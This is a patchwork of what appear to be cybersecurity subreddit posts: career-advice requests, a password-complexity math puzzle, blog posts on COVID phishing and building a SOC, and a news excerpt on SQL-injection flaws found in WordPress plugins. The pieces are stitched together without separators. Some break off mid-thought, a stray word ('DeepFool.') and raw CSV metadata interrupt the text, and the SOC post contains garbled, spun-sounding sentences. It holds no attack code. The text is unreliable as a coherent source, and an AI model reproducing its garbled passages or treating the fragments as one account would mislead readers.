I graduate in a week and the job hunt has got even harder due to Covid. I am pursuing a career in Cybersecurity and I am open to relocation, I have a Bachelors in Computer Science from a ABET accredited university. I have had the pleasure of having two Cybersecurity internships my Junior and Senior year of college. My first internship was 8 months and it was all blue team work for a financial institution. While I was there my duties were: *o Prepare compliance and metric reports by collecting, analyzing and summarizing information security data* *o Research and prepare reports on new information security standards and technologies* *o Document information security guidelines and step-by-step operational procedures* *o Proactively seeks awareness of security vulnerabilities and threats and makes recommendations for risk mitigation* One project I did while I was there was improve their social engineering detection within the platform they used. I researched and developed rules in YARA to catch and Tag incoming reported phish. These tags would lead to automation that the platform could place the phish in respective categories i.e. low medium, and high risk. This made it so the Analyst wouldn't have to review the incoming phish that were most likely spam or newsletters and could focus on the phish that were targeting important personal within the company. I regularly queried the SIEM and pulled out any data that Analysts asked for or needed either for audits or other projects. I also had to write custom queries, alerts, and triggers for the SIEM that was used there. My second internship where I am currently at is all red team, the company has been providing information security services all over the United States for nearly two decades. There the duties I perform are: *o Phone social engineering assessments* *o Onsite social engineering assessments* *o Work on Security Auditing, Consulting, or Penetration Testing engagements* *o Conduct information security risk assessments* *o Provide high-quality documentation of work performed to clients* &amp;#x200B; It has been an incredible journey to experience both sides of security and I have learned so much from them. I have been looking for job openings for both red and blue team positions. However, I am leaning more to the blue team side of things. The jobs that interest me are SOC analysts, and Cyber/Information Security Analyst. I have a dream I want to achieve and passion for Cybersecurity. &amp;#x200B; If anyone on here knows someone or a company actively looking for college graduates for Cybersecurity, please feel free to comment or PM me. I have noticed through applying places that years of experience is where I fall short. Both my internships account for 1 years worth of experience however, most companies I have seen want 3-5+ years.

I'm currently an IT major and I am starting to despise all of my courses. However, I want to become a cybersecurity analyst and I feel as though this career would be the right fit for me. I also came across the data analyst / data scientist occupations. I'm still iffy on those two but cybersecurity has always had a special place in my heart since I love security and keeping users' information safe from nefarious people. Currently, I'm a rising junior so I feel like I have a little bit of leeway when it comes to switching my major; I just have to be strategic with my upcoming courses to graduate in a timely manner. I'm also at risk for getting kicked out of all tech majors at my school because of my unsuccessful attempts in my overall courses. If I fail or withdraw from another course, I'm done with being a tech major. So, this is where my question is really stemming from. I always loved math and always thought it was so beautiful how everything can be calculated and have one solution. It's so exact, but I also enjoy creativity and making something my own. The reason why I'm not a math major now is because of a difficult course called Computer Science 1 that I cannot pass for my life. The professors teach it horribly and its know at my school for being the weed out course for cs and it majors. Im currently taking it right now for the second time and my grade terrible. I tried YouTube, free courses online, my cousin that is in the tech industry, office hours, you name it. Plus, if I fail this course again, I'm kicked out of my major. With all that being said, a stat major would be the best fit for me. My main concern is if I gain a statistics degree, could I be able to become a cybersecurity analyst and climb the latter to become a cybersecurity architect or engineer?

I have obtained multiple certifications (CISSP, sec+, net+, and more) but i have no SOC Analyst skills. As for a little snippet of my background: I have done some udemy and cybrary courses where i dived into kali linux to learn some hacking methodologies and techniques using metasploit, nmap, nikto, burpsuite, etc.. barely scratched the surface on how to use Splunk for SIEM experience, but plan to do more... did some labs on Snort IDS, Security Onion, and a little bit of suricata... but that was all about a year ago that I did on my own.

This is why I feel a little overwhelmed. I feel like there's so many things i need to know and so many things to keep up with that I already feel like a sort of information overload. I need to know the necessities and what is required of the job as a baseline and start from there. Then keep trying to improve my skills more and more."

I've been in this forum for around a year now and graduated in December with my degree in Cybersecurity. I took about a month off after because of how stressful life has been the last two years, and have been struggling to find a job. I'm not quite sure of the path that I'm looking to take in the future, so it's hard to find a position that REALLY sticks out to me. A lot of the positions (even when I cater my search to entry level) have at least ""3+ years of experience"" in the description. I'm starting to lose a lot of hope and questioning my career choice due to the lack of replies and interviews that I have gotten. COVID-19 hasn't made this easier for me at all, but I am lost in what to do right now. I have my largest gap of employment since my first job, haven't done the most in terms of keeping my skills up to date, and I don't know what my next step to get back on track is. Anybody have some advice/tips? I saw there's a bunch of free courses and resources pinned on this subreddit, are there any you would strongly recommend? What positions should I be applying for that will help me at least get my foot in the door and help start my career? I apologize because I never thought I'd post something like this, desperate for answers. I'm not sure where else I could go right now though and this subreddit in the past has been super helpful and everyone (who are mostly professionals too) is kind and seems to actually care and put time in their responses.

Please be gentle :) You dont get pointed in the direction of STEM studies as a girl typically. Its alway humanities.... Went straight to uni out of high school to get my AA and BA in Political Science because I was fascinated by terrorism and counter-terrorism. As one of the first kids in my family to go to college, there wasnt a lot of good input on how to go about it, so I just chugged along and passed the classes, got the credits, etc. Only AFTER I graduated did I realize how broad the program was and that it wouldnt really help me do anything other than get interviews for basic jobs (this is my personal experience, I am not generalizing this in any way nor am insinuating that this particular major is bad). After spending years working various office jobs, I realized I had a knack for computers. Basic troubleshooting, fixing things at first, but eventually it evolved into finding security issues and ways to get around admin access and reporting it to the IT team just to be nice. Getting praise is great, but as the days go by, I realize that I could learn to do more stuff like this. Even greater stuff that helps companies I work for. Or even my country! After some soul searching, I realized that cybersecurity work could be the intersection between the skills that Ive acquired, my interests, and my passions. Ive been looking into various BA programs in cybersecurity, and I have my sights set on starting in the next few months. THE CONCERN: However, I have ANOTHER online uni saying Why stop at BA when you can get a MBA??? Itll be cheaper!! And it will take less time! It sounds like a trap. Id like to think that Im no dummy, and skipping the meat and potatoes of a subject like this and going straight to an MBA just to say I have one doesnt wont add up.

However, even though as a defense/blue team professional, we still have to know some basic networking and offensive hacking knowledge as well. IT security jobs in my areas are looking for the following certs and HR seems to LOVE the below 4 certs: \-CISSP \-CISA \-CISM \-CEH \-Some needs CCNA as well. (None for Comptia Security+, so I'm skipping that cert) I figure it out that I may start with one of the entry level cert, CEH, the other 3 security certs required related IT security experiences so I can't do those yet. After gaining a few years of IT cert experiences then maybe go for CISSP afterward. I don't plan to study CCNA because I did take a networking course back in University and I know basic networking such as how packets transmit, ports, OSI model etc. I did look at about CCNA material a bit but realize it is going too far into how to configure a CISCO device and half of the exam is getting to know and memorizing those IOS commands....seems way too ""networking"" to me. As my goal is to land a Defensive/Blue team job or even SOC analyst/Incidence response rather than ""network admin/engineer"". Do you think it is good to start with CEH -&gt; Get a IT Security job and work for few years and work on CISSP? Do you think I can skip CCNA?

But this global outbreak of Coronavirus has forced these organizations to take the remote working. Yes, we are worrying about this current pandemic issue, but there are older issues is not get solves, including malicious Hackers. They are trying to using the current situation to steal the victims data. Most of the recent attacks are leveraging this pandemic by providing the link which says about the illness and let them click those links, and the hackers tried to enter the devices on those who are Work From Home. These hackers are creating Coronavirus themed Phishing Attacks techniques, and their goal is that the user needs to click that link which enables malicious malware. Know about remote working vulnerabilities Many Cybersecurity Firms are identifying that certain mobile application which promises the protection against the malware itself steals the information. The best way to protect your data is that you o not click on the link which is from unknown users. You have to install and download only from the trusted parties. This sudden increase in remote working will be introducing a new risk of Cyber Security Threats. The main reason behind these issues is communication which takes place only online. It helps hackers to steal ones sensitive and personal information. Hence you have to enhance your security and need to take care while verifying the remote identities. A recent attack held on the US health and human services agency. It aims to slow down the emergency information systems and to spread fake news via text messages. Tips to avoid them  You have to educate your team members and provide guidelines. It will help them to be aware of Cyber Threats. The warnings and training should be very simple to understand by every employee who is working in your organization.  The next thing is that you have to make all the decisions together. Because these decisions will not occur only in the board room, instead you have to call upon all the employees and take the decisions regarding security.  It is important for the remote workers to make sure about the connections to their resources on the public network should be encrypted.  The IT departments from every organization must ensure their own devices are patched regularly. And they need to ensure that all the devices have security software in it. We have to believe the fact that almost every business industry is shifting over the remote working due to the Coronavirus pandemic. Hence you have to offer a positive trend which will lead to enhance your security system. So, you have to involve in all steps as a team and provide an effective result.

Was mentorship difficult in terms of balancing a job, studies, and life? * How different would CSIS be in comparison to a general CS degree (wish I could Google this but seems not many comparisons are made between these two besides the former being a concentration in the field)? * Finally, cybersecurity has a lot of material and knowledge built on top of each other.

I can assume many of you have a passion or interest in cybersecurity, or maybe you're already in the industry which is great. I am an undergrad (second year) cybersecurity student trying to determine the correct path as I believe some of the decisions you can take now could have a great impact in early to mid-career. Right now I spend all my personal time pursuing CTF challenges on Vulnhub and sometimes Hackthebox. I find these challenges great fun with a massive learning curve with every box. As a result, I decided that Pen Testing has been a massive interest of mine but I recently knew that I didn't want to enter such a soon to be saturated field, and I didn't want to limit my general passion for cybersecurity to just Pentesting, which is a very specialised, popular and niche area to go into. My next thought was Incident Response as I am always interested in how cyber-attacks happen and what incident responders do straight after an attack. This is, however, a really forensic heavy (I think) area to go into which I'm quite uncertain about. I also understand the similarities between a SOC analyst and CIR/H, but I feel like being a SOC analyst is a more ""operational"" job rather than a proactive one which is something more of interest. The reason why I am writing this post and attempting to decide on my careers early steps is because I want to start pursuing the correct decisions now so I can get a good foothold in my early career to put me on the right track. I am hoping that you guys could maybe give an idea, based on what you know or your experience in Cyber Security to help me decide. I'm in a difficult situation where I like many different domains of cybersecurity but I'm finding it difficult to boil it down. I've used this website to get an understanding of the different jobs you can go into [URL I really like the idea of security consulting as I have great soft skills and an interest in being involved with testing / improving companies systems. I'd like to eventually oversee a most of the cybersecurity operations in a company but that's some years of hard work which I am prepared for :) Any ideas, experiences or even a conversation about this topic would be great."

I'm transitioning from military to civilian service. While I earned many certifications and degrees in cybersecurity while in the service, I didn't get to master any particular positions in the career field before getting pushed up into leadership/management roles (a common thing when you rank up in a promote or get out environment). Now I'm interning with a small business that is an MSP. They hired me and another member a couple months ago to become the company's first ever cyber security group and expect us to do everything. Anything from SOC to Pen Testing, this company is bidding on and/or promising as services to clients while we know we can't deliver. We are never asked if we are capable, and are reassured we are highly capable when we provide concerns. Also, this company doesn't even have its own internal things in order for compliance but is offering compliance assessments as a service to others. Meanwhile, the C-level members run between 2 or 3 meetings a week in a nearly all-hands manner to tell us two what to do, each with his or her own vision, as we continuously have meetings with customers, sales, and help desk members to drum up new sales, develop capabilities, etc. With shitty tools and leadership constantly telling us we are going fast and aren't slowing down (so keep up), I'm losing faith in the career path I've taken, my own capabilities, and I'm scared of the civilian sector if this is all it is about. Everything feels like a quick money grab with a half assed effort to help clients, but everything I turn in internally needs to be pristine and air tight to the leadership. Is this the norm or the exception?"

Its a bit simple but I enjoyed doing it. Was thinking in a privacy-friendly chat service and this idea came up. I try to resume the idea in a few words, im not entering full detailed mode (I dont wanna bore you) First of all, im using SSH to connect to the server. All files are in server side. The idea then.. you connect with SSH and execute the client, the server is listening in a localhost socket for your petitions (create user, login, open a new chat room, ..). When you enter a room, a encryption key is generated (in client process). This key is used for encryption before writing in chatroom, and decryption too. Not even the server knows what you talking. The server just write in chat what you send to him (encrypted text). And finally, some details about configuration: * Server runs in root mode. Users got their specific account with not privileges. * Users use rBash with private BIN dir, so they cant execute another command but the client. * When SSH session is created, client is opened. * Exiting client means quitting SSH session too. * You, as a client, can delete chat content or remove it, see chat members too. * And others things Im missing right now :D &amp;#x200B; URL URL &amp;#x200B; and thats it! Its a simply project I just wanted to share with you so you guys can give me your thoughts. Maybe I can drop source code too. Greetings!"

DeepFool.

I'm trying to weigh which offer would be the best to take, and would appreciate any advice y'all had to give! MITRE Corporation- I have been told that they are highly regarded in the InfoSec field and are very selective in choosing interns. They would also sponsor me for a clearance immediately. The education benefits and work life seem to be really great. The negatives I've heard is less compensation/bonuses because of being a non-profit, and career stagnation because they are a small company, and the work doesn't translate very well in the industry. Northrop Grumman- The offer is essentially being an aide to a director, and would allow me to try out different projects and join a team full time afterwards. I know they are a very big name but have heard that they have a high turnover and culture can change depending on team. L3Harris - They seem to be going through a major shift after the merger, and are building up their internal cyber division (the work would not be supporting a gov client or require a clearance). There seems to be a lot of opportunity, but the work would be internal to the company as they do not do security as a service. In comparison the other two offers are from companies that are well known for cybersecurity, and seem to be more prestigious names on a resume (although I've been told that skills trump accolades in this field).

Automated tools are an incredibly valuable way of testing for vulnerabilities, and when used effectively can help developers patch quickly and effectively. Relying purely on an automated tool for a vulnerability report wouldn't be my choice of submitting a report, Nash told The Daily Swig. If they went through and looked and confirmed all 5,000 vulnerabilities then my hat goes off to them, otherwise, I suspect there is a high level of false positives. It looks they are talking about 1,775 plugins with over 5,000 vulnerabilities, so I suspect again due to the automated nature they are probably hitting the same vulnerability and classifying it as new vulnerability each time it's referenced, he added. Despite these misgivings, Nash clarified that he felt the research was nonetheless worthwhile. None of that is to take away from the achievements, or the research done  they found potential vulnerabilities in 2% of plugins in the repository, Nash, an active member of both the WordPress and infosec communities, noted. We asked Garcia to confirm that the WordPress vulnerabilities discovered had been manually verified. Garcia responded: We have verified some manually and would say that most of them are vulnerable. We have not included functions that escape special characters We have only identified vulnerable plugins where the parameters are not validated. We know that maybe there are false positives, but we do not include as vulnerabilities code lines with validating functions like esc\_sql() or htmlspecialshars(), so we no that there are more than 5,000 POTENTIAL vulnerabilities, but the main thing is that the developers don't validate the SQL injections. ### RootedCON The two Spanish researchers presented their findings at the [RootedCON cybersecurity congress](URL in Madrid last weekend.

I am that passionate about cybersecurity. So with my background in managing web based projects not to mention other digital platforms, I thought I would be poised for just an entry level position like a junior consultant or even an co-op gig. All I want is to just get my foot in the door. Lo and behold, I've applied to more than 50 jobs and I'm not getting a single call back or even an email. I've tailored my resume and cover letters and I'm doing everything I can with whatever resources I have and it's still zilch. So my question is, how come when everyone and their dog says there's a lack of talent or shortage in cybersecurity and yet when I look for jobs, I'm seeing stuff like - Junior security analyst - minimum 3 years needed in infosec or related fields with experience implementing security protocols for cloud servers (WTF). It's a bit of a chicken and egg situation. I'm seriously contemplating on whether I should go for a CompTIA cert or study my ass off for CEH. I would love to do an OCSP at some point too and my uni is encouraging us to do our CISSP (Associate). I would love to do all of this, but I just can't help but feel that regardless of what cert I sit for, coupled with my background in digital I will still get rejected (and I suspect it's due to age but no one will outright say it due to being unethical). I think this is it. I'm on the brink of giving up. I've spent 3 years trying to break into this field, even offering to work for free before I studied and still nothing. I would love to say that cybersecurity has a lot of decent, supportive and collaborative folk but I'm starting to think I could be wrong. I think there's somewhat of an elitist mentality...if I don't have an OSCP I won't even be considered. If I didn't start out as a sysadmin, I won't be considered. If I've never help set up networks, I won't be considered. If I can't code super duper power code with python or java, I won't be considered. If I don't have top rankings on Hackerone, I won't be considered. Hell, if I didn't set up security protocols for IBM's Watson, I wouldn't be considered. I'm sorry but I'm tired, frustrated and kinda hitting a wall here. I've exhausted all of my funds, and my poor wife who's willing to dig into her own savings (which was reserved for a situation where if she got a bad asthma attack, it would be to pay for medical bills as we don't have insurance) to help get my certs was a 'writing's-on-the-wall' sign for me.

Currently I work as a Computer Operations Engineer (read: IT whipping boy) for a payments processor. Most of my experience is in business intelligence and in making sure critical processes don't fall apart. I told our CISO about my aspirations and he got a Comptia+ membership, and recommended I do the security+ training just to get up to speed. I've also been being given minor tasks related to cybersecurity (mainly just writing up checklists and company security awareness lessons). Online, some people recommend network+ then security+, some recommend A+ then network+ then security+, some other tech people I know IRL are recommending I dump comptia and switch completely to CISCO certs. Can I get reddit's opinion on this? &amp;#x200B; I thank you for your time and I hope you have a great day!"

I'm a DFIR Consultant, and I know that for my career transition, I started with the Security+, but for a non-technical person looking for a relatively non-technical role, is that what employers will be looking for? I'm thinking that a technical cert will: * Provide a foundational knowledge base; * Help his resume show up in searches; * Demonstrate he is serious about working in security. HOWEVER Because he isn't an IT pro already, I suspect he will need to start at the very beginning. If he gets a cert, it might need to be a progression of A+ &gt; Network+ &gt; Security+ and THEN shop his resume around, which is a considerable time investment. BUT, do you think he would be doing unnecessary work in that case if he is only looking for a customer facing / sales / auditor role. (I know I just said SALES in the subject, but I wanted to keep that simple).

So someday this week my manager called me and told me that a outsider malicious email was sent to him and another administrator with nude pictures of a female staff by her boyfriend. He asked me to delete all the alike emails from everyones account and quarantine certain words. Anyways I did that. And it was all good. Only I realized the next day someone from IT department deleted that quarantined words. They thought it was done by mistake most probably. Obviously it was my fault I did not let them know but I was so pissed and I removed them from the system as the super administrator then created a new access with only permissions/privileges they needed and assigned them this new access. So I heard that someone from IT department went to my manager claiming I removed their access from the system. My manager asks me to apologize for removing their access. But I only gave them the necessary accesses. I know we should control who can access what even in IT. So, what do you think best line of defense is here for me? Note. I don't have any problems with apologizing."

I am hoping for some advice from those in cyber and/or those who have completed online certificates (or even in-person non-degree university programs like U.T.s Bootcamp) on what the best way to get the fundamentals is. Of course, one of my main concerns is how my education will be perceived by future employers (i.e. what's the most reputable online certificates-- like George Washington University vs SANS.) I found the programs can be split between programs offered by universities and those by other online schools. I'd love to hear thoughts and feedback. Heres the breakdown: Group 1: Cyber studies from recognized universities, and it seems that the syllabus of these courses is a little more general and theoretical than technical. Group 2: Cyber education certificates from several different private colleges, offering various certificates by a cyber expert (eg Cyber Security Analyst CySA +) and job security.

Im not the type of person that would want to go to college its just not for me but if i have to absolutely do it i will. Im more of a working type person instead of a leaner in a classroom Ive talked to other people in the cyber security field and one of the guys that i was talking to didnt go to college and he reads books on cyber security and then takes a test for a certification for like 400 dollars for the test and if he passes he gets the certification but he needs to take 3. Is there a way i can do cyber security without going to college i know it seems that Im lazy and etc by not wanting to go to college but college just isnt for me and i just want to start working earlier. I think cyber security and networking is a great job to get into and it interests me i just need some idea on what to can be my best option not going to college for cyber security.

I would like to start by apologizing as all I mostly see on this sub is people asking how to get into this area of work and it clogs up the feed, but I thought as I need some advice myself on something slightly different that I would make a post about it. I am a recent graduate (December) with a Cybersecurity degree and I'm in the process of applying for different positions to begin my professional career! I have asked a lot of people for tips and recommendations on how to land a job in Cybersecurity and it has been a little help but nothing too crazy. I'm going to list what I've been told and found through my research online as I'm sure a lot of other people will take a look for their own self interest as well. I am also asking for any tips/advice on what to include on my resume or anything relating to landing a job in this profession as well and will be updating the post to make it easy for others to see. So let's start! **Tips from my personal experience (from people in the field and in my own experience/research):** \- Cater each Resume/cover letter to each position and company \- Experience is experience no matter how little it is \-----&gt; Even if you had a small job and didn't do the most (or zero) cybersecurity tasks in your IT job, it is still something to be proud of and don't sell yourself short with it \-----&gt; It may not even be an IT job, but customer service is sought after in every field nowadays and it will always be seen as a bonus \- Always be reading the latest on cybersecurity and other similar news as the most current exploits and information will always be relevant in this field \- Labs and any practice done on your own is something to put on your resume as it will show your potential employers that you are actively practicing on your own time, have an interest in the field, and it helps them see what you have done in your educational/personal experience \- Never burn your bridges with any company or past work place as references will always be relevant too \&gt;Some of these may have been brief and I know I'm forgetting some things that I've been told, but maybe some of this is new to someone and will help them in their situation too As for Resume advice, I am willing to take any tips or recommendations from any professional in this or a similar field. It's tough to land even an entry level cybersecurity job and anything will help. Also, if I can't seem to find a job that's cybersecurity specific, what would you recommend to do in reference to getting a job that will help me land on later down the road? I will be updating this periodically to make it easier for everyone! Thanks in advance and I'm hoping this does or will help!"

Two things that have been discussed (with nothing yet decided) include: 1. r/cybersecurity is for more technical discussions about cybersecurity, discussing the concepts, technologies, and threats in that realm. r/security is for discussing (still cyber / information) security programs, management, c-level issues, and things like that. Not sure how to do that breakdown, but that's the broad concept 2. r/security is self-post only and used for serious discussion and questions, and may be more heavily modded like other profession-based subreddits. r/cybersecurity allows news, links, and other content Another option is to merge the subs.

I troubleshoot active directory issues and user account permission problems. I fix printer server issues and find work arounds for applications that aren't fully supported with Win 10. The most I've done with Cybersecurity in my line of work is some light SEP remediation after we had a few units drift from baseline and fail to connect to the SEP server. I've studied hard to prepare myself for this position. I've pretty much put my life on hold studying for certs, building my home lab, using tools like vulnhub and hackthebox to practice pentesting and vulnerability scanning. I really don't want to blow this opportunity but right now I don't have a good answer to the classic recruiter line, ""So, walk me through your day working at \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_"" . This is the question i'm worried about most. Can you guys help?"

I've got a job lined up with a Federal contractor as an Intelligence Analyst doing OSINT Global Counter-Narcotics Analysis and investigation support. This isn't the type of intel I really wanted to support, but I'm happy to begin my career here nonetheless. I've wanted to get into Counterintelligence/Insider Threat etc. And as I look at job openings so I can plan for the future, CyberIntel for CI &amp; IT is understandably huge. In a few years, I'll have Intelligence Analysis experience that I know will be desired for a career in this field, but I have 0 knowledge of Cybersecurity. Where should I start? I literally have 0 background knowledge of anything computer related (I've avoided it like the plague, but I've since realized that I've got the critical thinking, analytical skills to be good at it). Having done a little research now, and I've become super confused on all of the Alphabet soups of trainings, coding languages, Operating Systems, etc. My initial plan is to start with Codeacedmy to learn coding languages for Data Analysis (Python, SQL)- their website and reviews make it seem like a great option for someone like me who has 0 experience. I understand that in cybersecurity, one should learn how to Operating Systems, so I figured online courses in Linux, Windows, Mac would be the next step. My University, which I'll still be living close to with my new job, offers a Graduate Certificate (4 classes/ 12 credits) in Applied Cybersecurity. I figure that after a few years learning on my own after graduation, a formal certificate in Applied Cybersecurity would be a good step to signal to future employers my ""skills"" in Cyber. To anyone who works in this field or has insight- is this a crazy plan? Reasonable? What would you recommend? Any and all feedback is massively appreciated because I'm feeling very lost in this space."

I have been searching around the web on applicable cybersecurity standards, and they all point me towards the more renowned cybersecurity frameworks: ISO 27000 Series and NIST. The problem I run into is that all these frameworks are more aimed towards creating a cybersecure organization i.e. from a management level. I am not sure how applicable these frameworks are in software design? Can some of these security controls be applied to the design of a software application? Maybe someone can point me towards some relevant documentation on designing a cybersecure application?

Only issue is I'm not very perceptive about determining which specific markets would fit a one-dude operation that already spends 55-60 hours at work. And for context I'm still in my mid-twenties, so the breadth and depth of my experience still has quite a ways to go. I'd say I'm far enough along a Dunning-Kruger curve to know how breathtakingly complicated IT and cybersecurity are, but nowhere near experienced enough not to try budging in some niche I'm not fully qualified for yet! So what sort of niches would be viable for me? Is there anything cybersecurity related I could do passively? If not, is small-time MSP work feasible? I'm even up for writing my own tools, but this market already seems saturated given how many incredible open-source tools are already out there. Maybe I'm just not very creative? Here are my qualifications: * Worked for a few years on a team as a Python + Django developer. I've also solo written some servers and binary protocol implementations in C for a side project. Done a good bit of NodeJS and frontend development as well, but don't enjoy either. * Been managing a security assessment + incident response team for about two years now. This role is both managerial and technical, but definitely more managerial. I've made the best use of it by spending time outside of work practicing the infrastructure building and hunting work that the analysts do. * I feel pretty good about setting up and managing Linux systems. My hands-on experience with Windows/AD administration is limited, but I've spent the past two months working to (finally) rectify that hands-on knowledge gap a bit. What I've picked up so far is nowhere near what a windows sysadmin would know, but I'm hoping to get there eventually. * Been using AWS for about 5ish years now. And by that, I'm really only familiar with EC2, Route 53, RDS, and the Billing service that I painfully look at each month. I've never messed with any of the auto-scaling stuff personally, but I could always dedicate some time and figure it out. * Pretty comfortable working with Splunk as a user, but less so as an administrator. I've set up single instance deployments before, but have never personally set up any of the crazy distributed deployments. * I have more experience working with Elastic Stack than I do Splunk. I've set up single instance and distributed deployments, and with the exception of fine-tuning Elasticsearch feel pretty comfortable with the process. * I've been working around Security Onion deployments and hunting for the past two years, but have just started to deep dive its capabilities in the past few months. * Got ICND1 and GCDA before realizing I don't care too much about getting certs just for the hell of it. I also did PWK for a month to learn about pentesting and managed to root 25 of the machines. I never cared to take OSCP, but would be willing to get it if it would open opportunities for me."

I understand that the field is broad and different degrees will be required for different careers in InfoSec. My current major is ""Computer Information Science: Information Systems Security"". My school offers multiple CIS degrees including Information Technology and my major amongst others. I am uncertain which degree is the right one for what we typically think about with ""cyber security"". To give an oversimplified description of the career I want to pursue, (and yes, its very vague), I want to *directly* protect data and defend against malicious attacks. I also want to be able to find vulnerabilities/pen-testing in software so that user data and personally identifiable information is not at the mercy of attackers. Use Python or other languages. You know, the things we typically think Since I've just started going to school this semester, I'm only in an Intro to Computer Science class and my professor said that Information Systems Security is what I should select as my major. He said that it is the ""true"" degree for cyber. However, on the school website it says this regarding my major: ""This degree is designed to give students *currently* employed as an Information Technology (IT) Professional the additional skill sets necessary to work in this rapidly growing field. "" The website description for the Information Technology degree says this: "" This degree allows students to acquire basic core Information Technology competencies that will prepare them for a career in Computer Networking, Cybersecurity, and related fields."" As you see, the Information Technology degree directly mentions cybersecurity. This is why I am confused as to which degree is the one that I need to be a cyber security expert and protect my people. Which one is correct? Or is it a different degree entirely? Thanks!"

Given an 8 character password which only uses upper\lower letters, what percentage of the total number of possibilities does this eliminate?",1,dwmme3,https://www.reddit.com/r/cybersecurity/comments/dwmme3/cryptography_while_attempting_to_choose_a_new/,2019-11-15 17:12:30,"I realize this is a different type of post for this subreddit. I x-posted this question to /r/mathriddles [here](URL and had some good participation, so I wanted to continue to share the fun here, since it was directly related to cybersecurity. It's essentially a password complexity problem, so it should be right up /r/cybersecurity's alley! **The problem:** While trying to create a user account in a new application at work, I came across the following rule: ""The password cannot use the same character twice in a row, for example Pa~~ss~~word fails because of the two adjacent S'es."" While I feel that this particular rule is rather odd, it piqued my interest as to how many passwords this actually invalidated. I had fun with this thought experiment, and hope you all do too. See the solution below! Spoiler, solution: &gt;!So the problem calls for an 8 character password with 52-wide character space. This means the total number of unique passwords is 52\^8. !&lt; &gt;!My initial logic brought me to the following observation. The password can 'iterate' in a few different ways (where 'n' is any random character): !&lt; &gt;! By the invalid pair, such as \`aannnnnn\`, \`bbnnnnnn\`, \`ccnnnnnn\`, all the way up to \`ZZnnnnnn\` (IE 52 possibilities)!&lt; &gt;!By the invalid pair position \`aannnnnn\`, \`naannnnn\`,\`nnaannnn\` all the way up to \`nnnnnnaa\` (IE 7 possibilities)!&lt; &gt;!By all possibilities of ""n"" \`aannnnnN\`, \`aannnnNn\`, \`aannnNnn\` all the way up from \`aaaaaaaa\` to \`aaZZZZZZ\` (ie 52\^6 possibilities)!&lt; &gt;!The problem with this approach is that it doesn't exclude ""duplicate"" invalid pairs, such as aabbnnnn or naabbnnn. (but it gets close)!&lt; &gt;!Instead, it's important to understand how this initial difficulty calculation works. In reality, the total complexity can be calculated by 52\*52\*52... 8 times. Essentially taking the total number of possible characters in each 'slot', and multiplying it with the whole!&lt; &gt;!In this problem however, we can actually apply this same principal to each 'slot' of the password, rather than breaking it down like I did in the above. For example, the first character of the password, can be one of 52 values, since it can be a to Z. !&lt; &gt;!The second character can be any value a to Z, !&lt;***except*** &gt;!whatever the first value was, meaning no matter what, there will always be 51 other characters that are valid, while only one gets eliminated!&lt; &gt;!The 3rd character is actually the exact same as the 2nd. The 3rd can be any thing a to Z, except whatever the 2nd character was. IE, 51 possibilities. !&lt; &gt;!Turns out, you can just extrapolate this all the way to the end, since every character after #1, can be exactly one of 51 possible characters, the formula ends up being (52\*51\*51\*51\*51\*51\*51\*51\*51), or rather, 52\*(51\^7)!&lt; &gt;!Ultimately, to calculate what percentage of the whole got eliminated by our rule, it would be 100(52)(51\^7J)\\52\^8!&lt; &gt;!Equaling 12.7% of total possible passwords eliminated!!&lt; Hope you all had fun, I'm definitely not a math person, but since this is directly up the cybersecurity lane, I figured i'd share it with ya'll in hopes that you have fun solving the riddle!"

Healthcare cybersecurity has a solution to eliminate the chances of cyberattacks. And the solution is SOC. SOC is not a new concept. It has been a part of a nations military and national security departments from many years. A security operations center is a team of experts and cybersecurity analyst and also trained engineers. It detects, prevents, investigates, responds to and analyses cyber threats. SOC team is dedicated to high- quality IT security operations. SOC uses both the latest technologies and best practices with procedures to keep organizations cybersecurity up to date. It has the ability to monitor all systems continuously without hesitation of shift work of employees. It continuously monitor the logging activity. Team uses a multiple computer programs and specialized security processes that analyzes the weak point of companys virtual infrastructure and protect the company from occurring an intrusion or theft. ### Importance of Security &amp; Operations center(SOC)- SOC offers a complete data security to the organizations data. With the help of SOC, an organization can go to the deep of network to discover the weaknesses and build an active detection system. SOC allows security functions to work more broadly and faster. SOC is able to detect when something wrong activity occurs with the network and handle that situation appropriately according to the security concern. ### How Security &amp; Operations center(SOC) works? The initial phase in setting up an associations SOC is to plainly characterize a procedure that consolidates business- explicit objectives from different offices just as information and backing from administrators. As strategy has been developed, the infrastructure required to support that strategy must be implemented. The exemplary SOC infrastructure has firewalls, IPS/IDS, break detection solutions, probes and security data and also event management system. Technology collects data via data flows, packet capture, telemetry, syslog and other methods so that data activities can interact and analyzed by SOC team. The SOC monitors networks and activities to protect important and sensitive data. ### How to build SOC? 1. Develop a strategy to build SOC. It includes identifying your key business objectives and real time capabilities. 2. Start SOC with the core functions. These include monitoring, detection, response and recovery. Delay the non- core functions until your core functions are mature. 3. Keep SOC design firm to the foundation. Start with some critical use cases and design the initial solution for those use cases. 4. Define your functional requirements based on your business objectives. Then choose a SOC model based on these technical requirements. Design the technical architecture for your SOC. This would include defining workflows, figuring out the areas for automation and also identifying the business and information systems to be integrated. 5. Ensure that the SOC staff devices are completely protected and require verification. Also, make sure that remote access mechanisms are in place for both SOC staff and outsourced staff, if any. 6. Verify log management infrastructure, onboard a minimum collection of data- critical resources and onboard your security analytics and automation capabilities. At last, start deploying end-to-end use cases from threat detection to response and recovery. Interoperability of the system is critical. 7. Consolidate threat intelligence feeds and automated inputs from different sources. This will help to improve your SOC detection capabilities. As a result, this directly improves the performance. 8. You can start with the implementation as you set up your technology and deployed the capabilities. Test all use cases comprehensively, especially to some shifts and in between changes. Try to make the reliability and security of the solution as possible. 9. Finally, check that you dont leave the SOC on autopilot once it is operational. It requires continuous fine- tuning and maintenance to keep it running. This also includes tuning to improve detection capabilities, integrating other systems as inputs or outputs, and periodically reviewing the SOC staff, model and requirements. ### Benefits of having SOC- Actions performed by SOC has significant effect on business outcomes. Cybersecurity is increasingly crucial, brands that embrace more protective measures and keep them ahead. SOCs can give positive results due to focus and expertise. Some benefits are as follows. #### Centralizing the display of assets- Real time use of software and processes helps organizations to ease the problem detection as they occur sooner. Centralized and continuous visualization SOC monitoring is more advantageous in maintaining the smooth operations. #### Increase the employee and clients trust- Clients and employees want their information to be safe because it was given to the company. Applying security procedures prevents data loss and so is the best way to improve brand integrity. #### Collaborating across departments and functions- SOC are a team having highly trained engineers which offers security to the organizations. As they work with cybersecurity incidents, so require other departments to work parallely to solve a problem with efficiency. It requires to coordinate and communicate with organizations. #### Increasing the awareness, Decreasing the cost- Most important advantage of SOC is, it increases the ability to control all systems and reduce the loss of data and prevents the financial loss. SOC helps 